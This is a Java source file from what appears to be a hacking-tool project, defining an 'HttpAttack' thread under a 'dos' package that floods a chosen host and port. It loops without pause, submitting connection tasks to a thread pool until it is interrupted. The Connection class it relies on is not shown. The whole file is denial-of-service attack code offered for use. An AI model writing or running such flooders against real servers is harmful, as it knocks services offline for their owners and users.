package com.izoman.hcktool.intermediate.dos;

import java.util.concurrent.TimeUnit;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;

public class HttpAttack extends Thread {
    private String host;
    private int port;
    private int interval;
    private BlockingQueue<Runnable> workers;
    private ThreadPoolExecutor executor;

    public HttpAttack(String inetAddr, int port, int interval, int connAmount) {
        this.host = inetAddr;
        this.port = port;
        this.interval = interval;
        workers = new ArrayBlockingQueue<Runnable>(connAmount);
        executor = new ThreadPoolExecutor(connAmount, connAmount + 10, interval + 200, TimeUnit.MILLISECONDS, workers, new ThreadPoolExecutor.DiscardPolicy());
    }

    @Override
    public void run() {
        while (true) {
            executor.submit(new Connection(host, port, interval));
            if (isInterrupted()) break;
        }
        executor.shutdown();
        try {
            executor.awaitTermination(1000, TimeUnit.MILLISECONDS);
        } catch (InterruptedException e) {
            executor.shutdownNow();
            Thread.currentThread().interrupt();
        }
    }
}
